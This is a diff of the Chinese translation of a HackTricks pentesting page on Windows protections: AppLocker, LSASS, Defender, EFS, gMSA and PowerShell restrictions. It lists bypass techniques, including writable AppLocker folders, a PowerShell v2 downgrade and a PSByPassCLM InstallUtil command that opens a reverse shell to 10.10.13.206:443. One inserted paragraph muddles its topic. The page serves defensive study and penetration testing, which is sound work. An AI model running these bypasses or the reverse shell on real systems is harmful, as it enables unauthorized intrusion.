@@ -7,14 +7,14 @@
 * 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
 * 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
 * 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
-* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **通过向[hacktricks仓库](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud仓库](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。
 
 </details>
 
-![](<../.gitbook/assets/image (9) (1) (2).png>)
+<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
-使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和**自动化工作流程**，使用全球**最先进的**社区工具。\
+使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和**自动化工作流程**，使用全球**最先进**的社区工具。\
 立即获取访问权限：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -23,7 +23,7 @@
 
 应用程序白名单是一份批准的软件应用程序或可执行文件列表，允许其存在和运行在系统上。其目标是保护环境免受有害的恶意软件和不符合组织特定业务需求的未经批准的软件。
 
-[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker)是微软的**应用程序白名单解决方案**，它使系统管理员能够控制**用户可以运行的应用程序和文件**。它提供对可执行文件、脚本、Windows安装程序文件、DLL、打包应用程序和打包应用程序安装程序的**细粒度控制**。\
+[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker)是微软的**应用程序白名单解决方案**，它使系统管理员能够控制**用户可以运行的应用程序和文件**。它提供对可执行文件、脚本、Windows安装程序文件、DLL文件、打包应用程序和打包应用程序安装程序的**细粒度控制**。\
 通常组织会**阻止cmd.exe和PowerShell.exe**以及对某些目录的写访问，**但这些都可以被绕过**。
 
 ### 检查
@@ -41,7 +41,7 @@ $a.rulecollections
 
 ### 绕过
 
-* 绕过AppLocker策略的有用**可写文件夹**：如果AppLocker允许在`C:\Windows\System32`或`C:\Windows`中执行任何内容，则可以使用**可写文件夹**来**绕过此限制**。
+* 绕过AppLocker策略的有用**可写文件夹**：如果AppLocker允许在`C:\Windows\System32`或`C:\Windows`中执行任何内容，则有一些**可写文件夹**可用于**绕过此限制**。
 ```
 C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
 C:\Windows\System32\spool\drivers\color
@@ -49,7 +49,7 @@ C:\Windows\Tasks
 C:\windows\tracing
 ```
 * 常见的**受信任的**[**"LOLBAS's"**](https://lolbas-project.github.io/)二进制文件也可以用来绕过AppLocker。
-* **编写不良的规则也可能被绕过**
+* **编写不良的规则也可能被绕过**。
 * 例如，**`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**，您可以在任何地方创建一个名为`allowed`的文件夹，它将被允许。
 * 组织通常也会专注于**阻止`%System32%\WindowsPowerShell\v1.0\powershell.exe`可执行文件**，但忽略了**其他**[**PowerShell可执行文件位置**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations)，如`%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`或`PowerShell_ISE.exe`。
 * 由于它可能对系统造成额外负载并需要进行大量测试以确保不会出现问题，**很少启用DLL强制执行**。因此，使用**DLL作为后门将有助于绕过AppLocker**。
@@ -59,19 +59,19 @@ C:\windows\tracing
 
 ### 安全账户管理器（SAM）
 
-本地凭据存储在此文件中，密码已经被哈希。
+本地凭据存储在此文件中，密码已经进行了哈希处理。
 
 ### 本地安全机构（LSA）- LSASS
 
-为了实现单点登录，**凭据**（哈希）被**保存**在此子系统的内存中。\
-**LSA**管理本地**安全策略**（密码策略、用户权限...）、**身份验证**、**访问令牌**...\
-LSA将**检查**提供的凭据是否在**SAM**文件中（用于本地登录），并与**域控制器**进行通信以对域用户进行身份验证。
+为了实现单点登录，**凭据**（经过哈希处理）存储在此子系统的内存中。\
+**LSA**管理本地**安全策略**（密码策略、用户权限等）、**身份验证**、**访问令牌**等。\
+LSA将检查提供的凭据是否存在于SAM文件中（用于本地登录），并与域控制器进行身份验证。
 
-**凭据**被保存在**LSASS进程**中：Kerberos票据、NT和LM哈希、易于解密的密码。
+**凭据**存储在**LSASS进程**中：Kerberos票据、NT和LM哈希、易于解密的密码。
 
 ### LSA秘密
 
-LSA可能会在磁盘上保存一些凭据：
+LSA可能会将某些凭据保存在磁盘上：
 
 * Active Directory计算机帐户的密码（无法访问的域控制器）。
 * Windows服务帐户的密码
@@ -84,11 +84,11 @@ LSA可能会在磁盘上保存一些凭据：
 
 ## Defender
 
-[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender)是一款可在Windows 10、Windows 11和Windows Server版本中使用的防病毒软件。它会**阻止**常见的渗透测试工具，如**`WinPEAS`**。然而，有办法**绕过这些保护**。&#x20;
+[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender)是一款可用于Windows 10、Windows 11和Windows Server版本的防病毒软件。它会**阻止**常见的渗透测试工具，如**`WinPEAS`**。然而，有办法**绕过这些保护**。
 
 ### 检查
 
-要检查**Defender**的**状态**，可以执行PS cmdlet **`Get-MpComputerStatus`**（检查**`RealTimeProtectionEnabled`**的值以了解是否激活）：
+要检查**Defender**的状态，可以执行PS cmdlet **`Get-MpComputerStatus`**（检查**`RealTimeProtectionEnabled`**的值以了解是否已激活）：
 
 <pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus
 
@@ -117,12 +117,12 @@ sc query windefend
 ```
 ## EFS（加密文件系统）
 
-EFS通过使用批量**对称密钥**（也称为文件加密密钥或**FEK**）对文件进行加密。然后，FEK使用与加密文件相关联的用户的**公钥**进行**加密**，并将加密的FEK存储在加密文件的$EFS **替代数据流**中。要解密文件，EFS组件驱动程序使用与EFS数字证书（用于加密文件）匹配的**私钥**来解密存储在$EFS流中的对称密钥。来源：[这里](https://en.wikipedia.org/wiki/Encrypting\_File\_System)。
+EFS通过使用一个批量的**对称密钥**（也称为文件加密密钥或**FEK**）对文件进行加密。然后，FEK使用与加密文件的用户相关联的**公钥**进行**加密**，并将加密的FEK存储在加密文件的$EFS **替代数据流**中。要解密文件，EFS组件驱动程序使用与EFS数字证书（用于加密文件）匹配的**私钥**来解密存储在$EFS流中的对称密钥。来源：[这里](https://en.wikipedia.org/wiki/Encrypting\_File\_System)。
 
 以下是未经用户请求解密的文件示例：
 
-- 在复制到使用其他文件系统（如[FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table)）格式化的卷之前，文件和文件夹会被解密。
-- 使用SMB/CIFS协议通过网络复制加密文件时，文件在发送到网络之前会被解密。
+- 在将文件和文件夹复制到使用其他文件系统（如[FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table)）格式化的卷之前，文件和文件夹将被解密。
+- 使用SMB/CIFS协议通过网络复制加密文件时，文件在发送到网络之前将被解密。
 
 使用此方法加密的文件可以被**所有者用户透明地访问**（即加密文件的用户），因此如果您能**成为该用户**，则可以解密文件（更改用户的密码并登录为该用户将不起作用）。
 
@@ -137,7 +137,7 @@ EFS通过使用批量**对称密钥**（也称为文件加密密钥或**FEK**）
 
 #### 成为Authority System
 
-这种方法要求**受害用户**在主机上**运行**一个**进程**。如果是这种情况，使用`meterpreter`会话，您可以模拟用户进程的令牌（使用`incognito`中的`impersonate_token`命令）。或者您可以直接`migrate`到用户的进程。
+这种方法需要**受害用户**在主机上**运行**一个**进程**。如果是这种情况，您可以使用`meterpreter`会话来模拟用户进程的令牌（使用`incognito`中的`impersonate_token`命令）。或者您可以直接`migrate`到用户的进程。
 
 #### 知道用户的密码
 
@@ -154,13 +154,13 @@ EFS通过使用批量**对称密钥**（也称为文件加密密钥或**FEK**）
 - 可以用于运行计划任务（管理服务帐户不支持运行计划任务）。
 - 简化的SPN管理-如果计算机的**sAMaccount**详细信息或DNS名称属性发生更改，系统将自动更改SPN值。
 
-gMSA帐户的密码存储在一个名为_**msDS-ManagedPassword**_的LDAP属性中，这些密码每30天由DC自动重置，可以被**授权管理员**和安装在其上的**服务器**检索。_**msDS-ManagedPassword**_是一个加密的数据块，称为[MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)，只有在连接安全时（使用LDAPS）或身份验证类型为“封装和安全”时才能检索。
+gMSA帐户的密码存储在一个名为_**msDS-ManagedPassword**_的LDAP属性中，这些密码每30天由DC自动重置，可以被**授权管理员**和安装在其上的**服务器**检索。_**msDS-ManagedPassword**_是一个加密的数据块，称为[MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)，只有在连接被安全保护（使用LDAPS）或身份验证类型为“封装和安全”时才能检索。
 
 ![Image from https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)
 
 因此，如果正在使用gMSA，请查找它是否具有**特殊权限**，并检查您是否有**权限**读取服务的密码。
 
-您可以使用[**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)读取此密码：
+您可以使用[**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)来读取此密码：
 ```
 /GMSAPasswordReader --AccountName jkohler
 ```
@@ -176,7 +176,7 @@ gMSA帐户的密码存储在一个名为_**msDS-ManagedPassword**_的LDAP属性�
 
 ## PowerShell受限语言模式
 
-PowerShell **** [**受限语言模式**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **限制了许多需要有效使用PowerShell的功能**，例如阻止COM对象，只允许批准的.NET类型，基于XAML的工作流，PowerShell类等。
+PowerShell **** [**受限语言模式**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **限制了许多需要有效使用PowerShell的功能**，例如阻止COM对象，只允许批准的.NET类型，基于XAML的工作流程，PowerShell类等。
 
 ### **检查**
 ```powershell
@@ -185,16 +185,18 @@ $ExecutionContext.SessionState.LanguageMode
 ```
 ### 绕过
 
-Bypass (绕过)
+Bypassing refers to the act of circumventing or evading security measures in order to gain unauthorized access or privileges. In the context of Windows hardening, bypassing typically involves finding vulnerabilities or weaknesses in authentication, credentials, User Account Control (UAC), and Encrypting File System (EFS) to bypass security controls and gain elevated privileges or access to sensitive information.
+
+绕过指的是绕过或逃避安全措施，以获取未经授权的访问或特权。在Windows加固的背景下，绕过通常涉及查找身份验证、凭据、用户帐户控制（UAC）和加密文件系统（EFS）中的漏洞或弱点，以绕过安全控制，获得提升的特权或对敏感信息的访问。
 ```powershell
 #Easy bypass
 Powershell -version 2
 ```
-在当前的Windows版本中，旧的绕过方法已经不再适用，但你可以使用[**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM)。
+在当前的Windows系统中，绕过操作将不起作用，但您可以使用[**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM)。
 
-**编译它时，你可能需要** **添加一个引用** -> _浏览_ -> _浏览_ -> 添加 `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` 并且**将项目更改为 .Net4.5**。
+**要编译它，您可能需要** **添加一个引用** -> _浏览_ -> _浏览_ -> 添加 `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` 并**将项目更改为 .Net4.5**。
 
-#### 直接绕过方法：
+#### 直接绕过：
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
 ```
@@ -202,7 +204,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 
 A reverse shell is a type of shell in which the target machine initiates the connection to the attacker's machine. This allows the attacker to gain remote access to the target machine and execute commands. Reverse shells are commonly used in post-exploitation scenarios to maintain persistent access to a compromised system.
 
-一个反向 shell 是一种 shell，其中目标机器发起与攻击者机器的连接。这使得攻击者能够远程访问目标机器并执行命令。反向 shell 在后渗透场景中常用于维持对被入侵系统的持久访问。
+反向 shell 是一种 shell，其中目标机器发起与攻击者机器的连接。这使得攻击者能够远程访问目标机器并执行命令。反向 shell 在后渗透场景中常用于维持对被入侵系统的持久访问。
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
@@ -230,7 +232,7 @@ Powershell -command "Write-Host 'My voice is my passport, verify me.'"
 9º Use EncodeCommand
 $command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
 ```
-更多内容可以在[这里](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)找到
+更多信息可以在[这里](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)找到。
 
 ## 安全支持提供程序接口（SSPI）
 
@@ -251,7 +253,7 @@ SSPI负责找到两台想要通信的机器的适当协议。首选的方法是K
 * **Negotiate**：用于协商要使用的协议（Kerberos或NTLM，其中Kerberos是默认协议）
 * %windir%\Windows\System32\lsasrv.dll
 
-#### 协商可以提供多种方法或仅一种方法。
+#### 协商可以提供多种方法或仅提供一种方法。
 
 ## UAC - 用户帐户控制
 
@@ -263,10 +265,10 @@ SSPI负责找到两台想要通信的机器的适当协议。首选的方法是K
 
 
 
-![](<../.gitbook/assets/image (9) (1) (2).png>)
+<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 \
-使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)轻松构建和**自动化工作流程**，由全球**最先进的**社区工具提供支持。\
+使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和**自动化工作流程**，由全球**最先进的**社区工具提供支持。\
 立即获取访问权限：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -277,10 +279,10 @@ SSPI负责找到两台想要通信的机器的适当协议。首选的方法是K
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想获得最新版本的PEASS或下载PDF格式的HackTricks吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 你在**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者想要访问**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
 * 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获取[**官方PEASS和HackTricks衣物**](https://peass.creator-spring.com)
+* 获取[**官方PEASS和HackTricks的衣物**](https://peass.creator-spring.com)
 * **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
-* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。
+* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。
 
 </details>
